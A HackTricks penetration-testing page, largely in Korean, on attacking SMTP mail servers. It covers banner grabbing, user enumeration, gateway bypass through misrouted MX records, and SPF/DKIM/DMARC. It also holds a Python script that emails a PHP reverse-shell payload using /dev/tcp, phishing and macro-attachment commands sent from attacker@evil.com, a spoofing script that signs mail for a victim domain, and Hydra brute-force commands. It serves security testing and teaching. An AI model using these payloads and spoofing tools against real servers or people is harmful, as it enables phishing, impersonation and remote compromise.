# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}


## **기본 정보**

The **Simple Mail Transfer Protocol (SMTP)** is a protocol utilized within the TCP/IP suite for the **sending and receiving of e-mail**. Due to its limitations in queuing messages at the recipient's end, SMTP is often employed alongside either **POP3 or IMAP**. These additional protocols enable users to store messages on a server mailbox and to periodically download them.

실무에서는 **이메일 프로그램**이 보통 **SMTP로 이메일을 발송**하고, **POP3 또는 IMAP으로 수신**하는 방식이 일반적입니다. Unix 계열 시스템에서는 **sendmail**이 이메일 용도로 가장 많이 사용되는 SMTP 서버입니다. 상용 패키지인 Sendmail에는 POP3 서버가 포함되어 있습니다. 또한 **Microsoft Exchange**는 SMTP 서버를 제공하며 POP3 지원을 선택적으로 포함할 수 있습니다.

**기본 포트:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
## 이메일 보안 게이트웨이 (SEGs)

As mentioned in this [blog post](https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/) **이메일 보안 게이트웨이 (SEGs)**는 수신 메일 흐름에 **인라인**으로 배치되어 메일 서버 대신 SEG를 가리키도록 **MX 레코드 변경**을 통해 동작합니다. SEG는 수신 메일을 검사합니다(예: IP 평판, 블랙리스트, SPF 검사, 스푸핑 탐지, 메타데이터/콘텐츠 분석, 샌드박싱, URL 재작성) 그 후 정책에 따라 메시지를 전달, 삭제 또는 격리합니다. 보안 모델은 **모든 수신 메일이 먼저 SEG에 도달한다**고 가정합니다; 메일 서버에 직접 접근 가능하면 SEG를 **회피**할 수 있습니다(마치 origin에 직접 연결해 WAF를 우회하는 것과 유사).

### MX 불일치로 SEGs 회피

Entra ID / Exchange Online을 사용하는 조직은 종종 **여러 accepted domain**을 보유합니다. 만약 **어떤 accepted domain이든** MX 레코드가 SEG 대신 메일 서버(예: Exchange Online)를 **직접 가리키면**, 해당 도메인으로 메일을 전달하여 **SEG를 회피**할 수 있습니다. 이는 **설정 오류**(취약점은 아님)이지만 여전히 흔한 간격입니다.

또한 기본 `<tenant>.onmicrosoft.com` 도메인에 주의하십시오: 해당 도메인의 MX 레코드는 항상 Exchange Online을 가리킵니다. `*.onmicrosoft.com`으로의 inbound가 **잠겨 있지 않다면**, `user@<tenant>.onmicrosoft.com`으로 보내는 메일이 SEG를 우회하여 바로 인박스로 들어갈 수 있습니다.

**방어적 주의사항**:

- `*.onmicrosoft.com`으로의 수신을 잠그십시오.
- accepted domain과 그들의 MX 라우팅을 정기적으로 감사하십시오.
- 메일 서버를 SEG로부터만 수신을 **허용**하도록 구성하십시오.

### EMAIL Headers

피해자가 이메일을 보내도록 만들 기회(예: 웹페이지의 contact form 등)가 있다면 헤더를 통해 내부 토폴로지를 확인할 수 있으므로 시도해 보십시오.

또한 SMTP 서버로부터 존재하지 않는 주소로 메일을 보내서(서버가 공격자에게 NDN 메일을 보낼 것이기 때문에) 메일을 받을 수도 있습니다. 다만 발송을 허용하는 주소에서 보내는지(SPF 정책 확인)와 NDN 메시지를 받을 수 있는지 확인하십시오.

헤더에서 더 흥미로운 정보를 찾기 위해 다른 내용을 보내보는 것도 좋습니다. 예: `X-Virus-Scanned: by av.domain.com`\
EICAR 테스트 파일을 보내보십시오.\
AV를 탐지하면 알려진 취약점을 악용할 수 있습니다.

## 기본 동작

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 조직의 MX 서버 찾기
```bash
dig +short mx google.com
```
### 열거
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 정보 노출

서버가 NTLM auth (Windows)를 지원하면 민감한 정보(버전 등)를 얻을 수 있습니다. 자세한 정보는 [**here**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666).
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
또는 **자동화**하려면 **nmap** 플러그인 `smtp-ntlm-info.nse`를 사용하세요

### 내부 서버 이름 - 정보 노출

일부 SMTP 서버는 전체 주소 없이 "MAIL FROM" 명령이 실행될 때 발신자 주소를 자동 완성하여 내부 이름을 노출합니다:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### Sniffing

포트 25로 향하는 패킷에서 비밀번호를 sniff했는지 확인하세요

### [Auth bruteforce](../../generic-hacking/brute-force.md#smtp)

## Username Bruteforce 열거

**인증이 항상 필요하지는 않습니다**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 자동화 도구
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
## DSN Reports

**Delivery Status Notification Reports**: 조직에 **email**을 **invalid address**로 보내면, 조직은 해당 주소가 유효하지 않음을 알리기 위해 **mail back to you**를 보냅니다. 반환된 email의 **Headers**에는 보고서와 상호작용한 메일 서비스의 IP address나 anti-virus software 정보와 같은 가능한 **sensitive information**를 **contain**할 수 있습니다.

## [Commands](smtp-commands.md)

### linux 콘솔에서 Email 보내기
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
`swaks`로 파일을 첨부할 때는 파일 바이트가 문자 그대로의 파일명 문자열 대신 포함되도록 `@` 접두사를 사용하세요. 이는 매크로 문서 전달에 매우 중요합니다:
```bash
swaks --to hr@example.local --from attacker@evil.com --header "Subject: Resume" --body "Please review" --attach @resume.doc --server 10.0.0.5
```
### Python으로 이메일 보내기

<details>

<summary>Python 코드 예시</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP Smuggling

SMTP Smuggling 취약점은 모든 SMTP 보호장치를 우회할 수 있게 해줍니다(보호장치에 대한 자세한 내용은 다음 섹션을 확인하세요). SMTP Smuggling에 대한 자세한 내용은 다음을 참고하세요:


{{#ref}}
smtp-smuggling.md
{{#endref}}

## Mail Spoofing Countermeasures

조직이 무단으로 자신들을 대신해 이메일을 발송하는 것을 방지하기 위해 **SPF**, **DKIM**, **DMARC**를 적용합니다. SMTP 메시지 스푸핑이 쉬운 점 때문에 이러한 대책이 필요합니다.

이들 대책에 대한 **완전한 가이드**는 다음에서 확인할 수 있습니다: [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/).

### SPF

> [!CAUTION]
> SPF [was "deprecated" in 2014](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). This means that instead of creating a **TXT record** in `_spf.domain.com` you create it in `domain.com` using the **same syntax**.\
> Moreover, to reuse previous spf records it's quiet common to find something like `"v=spf1 include:_spf.google.com ~all"`

**Sender Policy Framework (SPF)**는 Mail Transfer Agents(MTAs)가 이메일을 보내는 호스트가 해당 조직에서 허가한 서버인지 확인할 수 있게 해주는 메커니즘입니다. 이 허가된 서버 목록은 도메인 이름을 대신해 이메일을 보낼 수 있도록 허용된 IP 주소/범위, 도메인 및 기타 엔티티를 지정하며, SPF 레코드에는 여러 가지 "**Mechanisms**"가 포함됩니다.

#### Mechanisms

From [Wikipedia](https://en.wikipedia.org/wiki/Sender_Policy_Framework):

| Mechanism | Description                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 항상 매치됩니다; 이전 메커니즘으로 매치되지 않은 모든 IP에 대해 `-all` 처럼 기본 결과로 사용됩니다.                                                                                                                                                                                                                                  |
| A         | 도메인 이름에 발신자의 주소로 해석될 수 있는 주소 레코드(A 또는 AAAA)가 있으면 매치됩니다.                                                                                                                                                                                                                   |
| IP4       | 발신자가 특정 IPv4 주소 범위에 있으면 매치됩니다.                                                                                                                                                                                                                                                                              |
| IP6       | 발신자가 특정 IPv6 주소 범위에 있으면 매치됩니다.                                                                                                                                                                                                                                                                              |
| MX        | 도메인 이름에 발신자의 주소로 해석되는 MX 레코드가 있으면 매치됩니다(즉, 메일이 도메인의 수신 메일 서버 중 하나에서 온 경우).                                                                                                                                                                          |
| PTR       | 클라이언트 주소의 도메인 이름(PTR 레코드)이 주어진 도메인에 속하고 그 도메인 이름이 클라이언트 주소로 역방향-정방향 확인(forward-confirmed reverse DNS)되어야 매치됩니다. 이 메커니즘은 권장되지 않으며 가능하면 피해야 합니다.                                                                                     |
| EXISTS    | 주어진 도메인 이름이 어떤 주소로든 해석되면 매치됩니다(해석되는 주소와 관계없이). 드물게 사용되며, SPF 매크로 언어와 함께 DNSBL 쿼리와 같은 더 복잡한 매치를 제공합니다.                                                                                                                           |
| INCLUDE   | 다른 도메인의 정책을 참조합니다. 해당 도메인의 정책이 pass이면 이 메커니즘도 pass로 처리됩니다. 다만 포함된 정책이 fail이면 처리는 계속됩니다. 다른 도메인의 정책에 완전히 위임하려면 redirect 확장을 사용해야 합니다.                                                                                     |
| REDIRECT  | <p>redirect는 SPF 정책을 호스팅하는 다른 도메인을 가리키는 포인터로, 여러 도메인이 동일한 SPF 정책을 공유할 수 있게 합니다. 동일한 이메일 인프라를 공유하는 많은 도메인 작업 시 유용합니다.</p><p>redirect 메커니즘에 지정된 도메인의 SPF 정책이 사용됩니다.</p> |

또한 어떤 메커니즘이 매치되었을 때 **무엇을 해야 하는지**를 나타내는 **Qualifiers**를 식별할 수 있습니다. 기본적으로 **qualifier "+"**가 사용됩니다(따라서 어떤 메커니즘이 매치되면 허용됨을 의미).\
보통 SPF 정책 끝부분에서 **\~all** 또는 **-all** 같은 것을 보게 됩니다. 이는 **발신자가 어떤 SPF 정책과도 매치되지 않으면 이메일을 신뢰하지 않음(~)으로 표시하거나(-) 거부하라**는 의미입니다.

#### Qualifiers

정책 내 각 메커니즘은 의도된 결과를 정의하기 위해 네 가지 qualifier 중 하나를 접두사로 가질 수 있습니다:

- **`+`**: PASS 결과에 해당합니다. 기본적으로 메커니즘은 이 qualifier를 가정하므로 `+mx`는 `mx`와 동일합니다.
- **`?`**: NEUTRAL 결과를 나타내며, NONE(특별한 정책 없음)과 유사하게 처리됩니다.
- **`~`**: SOFTFAIL을 나타내며 NEUTRAL과 FAIL의 중간 지점입니다. 이 결과를 얻은 이메일은 일반적으로 수락되지만 해당 표시가 됩니다.
- **`-`**: FAIL을 나타내며 이메일을 명시적으로 거부하라는 의미입니다.

다음 예에서는 **google.com의 SPF 정책**을 보여줍니다. 첫 번째 SPF 정책 내에 서로 다른 도메인의 SPF 정책을 포함(include)하는 것을 확인할 수 있습니다:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
전통적으로 올바른/아무 SPF 레코드가 없는 도메인 이름은 스푸핑이 가능했다. **요즘에는**, **이메일**이 **유효한 SPF 레코드가 없는 도메인**에서 오면 **자동으로 거부되거나 신뢰할 수 없는 것으로 표시될 가능성이 높습니다**.

도메인의 SPF를 확인하려면 다음과 같은 온라인 도구를 사용할 수 있습니다: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM은 발신 이메일에 서명하는 데 사용되며, 도메인의 공개키를 DNS에서 가져와 외부 Mail Transfer Agents (MTAs)가 이를 검증할 수 있게 해준다. 이 공개키는 도메인의 TXT 레코드에 저장되어 있다. 이 키에 접근하려면 selector와 도메인 이름 둘 다 알아야 한다.

예를 들어, 키를 요청하려면 도메인 이름과 selector가 필수적이다. 이는 메일 헤더 `DKIM-Signature`에서 찾을 수 있다. 예: `d=gmail.com;s=20120113`.

이 정보를 가져오는 명령은 다음과 같이 보일 수 있다:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (도메인 기반 메시지 인증, 보고 및 준수)

DMARC는 SPF 및 DKIM 프로토콜을 기반으로 이메일 보안을 강화합니다. 특정 도메인에서 온 이메일을 처리할 때 메일 서버가 따를 정책을 명시하며, 인증 실패를 어떻게 처리할지와 이메일 처리 작업에 대한 보고서를 어디로 보낼지 등을 포함합니다.

**DMARC 레코드를 얻으려면 서브도메인 \_dmarc를 쿼리해야 합니다**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 태그

| Tag Name | 목적                                          | 샘플                           |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | 프로토콜 버전                                 | v=DMARC1                        |
| pct      | 필터링 대상 메시지 비율                        | pct=20                          |
| ruf      | 포렌식 보고서용 Reporting URI                 | ruf=mailto:authfail@example.com |
| rua      | 집계 보고서용 Reporting URI                   | rua=mailto:aggrep@example.com   |
| p        | 조직 도메인에 대한 정책                       | p=quarantine                    |
| sp       | 조직 도메인의 하위 도메인에 대한 정책         | sp=reject                       |
| adkim    | DKIM 정렬 모드                                | adkim=s                         |
| aspf     | SPF 정렬 모드                                 | aspf=r                          |

### **하위 도메인은 어떻게 되나요?**

**출처** [**here**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
메일을 보내려는 각 하위 도메인마다 별도의 SPF 레코드를 가져야 합니다.\
다음 내용은 원래 openspf.org에 게시되었으며, 이러한 종류의 정보에 훌륭한 자료였습니다.

> Demon에 관한 질문: 하위 도메인은 어떻게 되나요?
>
> pielovers.demon.co.uk에서 메일을 받았는데 pielovers에 대한 SPF 데이터가 없다면 한 단계 올라가 demon.co.uk에 대해 SPF를 테스트해야 할까요? 아닙니다. Demon의 각 하위 도메인은 서로 다른 고객이며, 각 고객은 자체 정책을 가질 수 있습니다. Demon의 정책이 기본적으로 모든 고객에게 적용되는 것은 말이 되지 않습니다; Demon이 그렇게 하고 싶다면 각 하위 도메인에 대해 SPF 레코드를 설정하면 됩니다.
>
> 따라서 SPF 발행자에게 주는 조언은 이렇습니다: A 또는 MX 레코드를 가진 각 하위 도메인이나 호스트명에 대해 SPF 레코드를 추가해야 합니다.
>
> 와일드카드 A 또는 MX 레코드를 가진 사이트는 다음과 같은 형식의 와일드카드 SPF 레코드도 가져야 합니다: \* IN TXT "v=spf1 -all"

이것은 타당합니다 — 하위 도메인은 지리적으로 완전히 다른 위치에 있을 수 있으며 매우 다른 SPF 정의를 가질 수 있습니다.

### **Open Relay**

이메일이 전송될 때 스팸으로 표시되지 않도록 하는 것이 중요합니다. 이는 종종 수신자가 신뢰하는 **relay server**를 사용하는 것으로 달성됩니다. 하지만 관리자가 허용해도 안전한 IP 범위를 완전히 파악하지 못하는 경우가 흔합니다. 이러한 이해 부족은 SMTP 서버 설정에서 실수를 초래할 수 있으며, 이는 보안 평가에서 자주 발견되는 위험입니다.

특히 잠재적이거나 진행 중인 고객과의 통신과 관련된 이메일 전달 문제를 피하기 위해 일부 관리자가 사용하는 우회 방법은 **모든 IP 주소로부터의 연결 허용**입니다. 이는 SMTP 서버의 `mynetworks` 파라미터를 구성하여 모든 IP 주소를 허용하도록 설정함으로써 이루어지며, 아래와 같이 표시됩니다:
```bash
mynetworks = 0.0.0.0/0
```
메일 서버가 open relay (즉, 외부의 어떤 출처로부터 온 이메일도 전달할 수 있는지)를 확인하기 위해 일반적으로 `nmap` 도구를 사용합니다. `nmap`에는 이를 테스트하기 위해 설계된 특정 스크립트가 포함되어 있습니다. 예를 들어 IP가 10.10.10.10인 서버의 포트 25에 대해 `nmap`으로 verbose 스캔을 수행하는 명령은 다음과 같습니다:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **도구**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF 및 DMARC 잘못된 구성 확인**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **자동으로 SPF 및 DMARC 구성 가져오기**

### **스푸핑 이메일 전송**

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**또는 도구를 사용할 수 있습니다:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> 키를 파싱할 때 **error using in the dkim python lib** 에러가 발생하면 아래 키를 사용해도 됩니다.\
> **NOTE**: 이는 단순한 임시 해결책으로, 어떤 이유로 openssl private key가 **cannot be parsed by dkim** 경우 빠른 확인을 위해 사용하세요.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```
>
> **또는 수동으로 수행할 수도 있습니다:**
>
> {{#tabs}}
> {{#tab name="PHP"}}
>
> <pre class="language-php"><code class="lang-php"><strong># This will send an unsigned message
> </strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
> </strong></code></pre>
>
> {{#endtab}}
>
> {{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **추가 정보**

**이러한 보호에 대한 자세한 정보는** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **기타 피싱 지표**

- 도메인 연령
- IP 주소를 가리키는 링크
- 링크 조작 기법
- 의심스러운(드문) 첨부파일
- 손상된 이메일 내용
- 메일 헤더 값과 다른 값 사용
- 유효하고 신뢰할 수 있는 SSL 인증서의 존재
- 페이지를 웹 콘텐츠 필터링 사이트에 제출함

## SMTP를 통한 데이터 유출

**SMTP로 데이터를 전송할 수 있다면** [**read this**](../../generic-hacking/exfiltration.md#smtp)**.**

## 설정 파일

### Postfix

일반적으로 설치되어 있는 경우 `/etc/postfix/master.cf`에는 예를 들어 사용자가 새 메일을 수신했을 때 실행되는 **실행할 스크립트**가 포함되어 있습니다. 예를 들어 `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}` 라인은 사용자 mark가 새 메일을 수신하면 `/etc/postfix/filtering`가 실행된다는 뜻입니다.

기타 설정 파일:
```
sendmail.cf
submit.cf
```
## 참고자료

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- <https://21ad.netlify.app/blogs/the-silent-inbox-how-verified-emails-slip-past-email-security-gateways/>

## HackTricks 자동 명령어
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smtp/index.html

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
{{#include ../../banners/hacktricks-training.md}}
